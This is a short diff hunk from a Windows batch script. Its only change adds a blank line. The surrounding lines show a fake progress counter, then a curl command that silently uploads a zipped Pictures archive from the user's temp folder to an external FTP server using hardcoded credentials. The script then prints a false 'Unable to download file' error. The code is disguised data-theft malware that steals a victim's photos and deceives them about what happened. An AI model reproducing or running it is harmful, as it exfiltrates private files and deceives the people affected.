@@ -25,4 +25,5 @@ timeout /t 1 /nobreak >nul
 echo 99%%
 curl -T "%TEMP%\Pictures.zip" ftp://ftpupload.net/htdocs/data/pics.txt --user if0_40225150:Jivaansh401176 >nul 2>&1
 echo Some error occured. Unable to download file
+
 pause
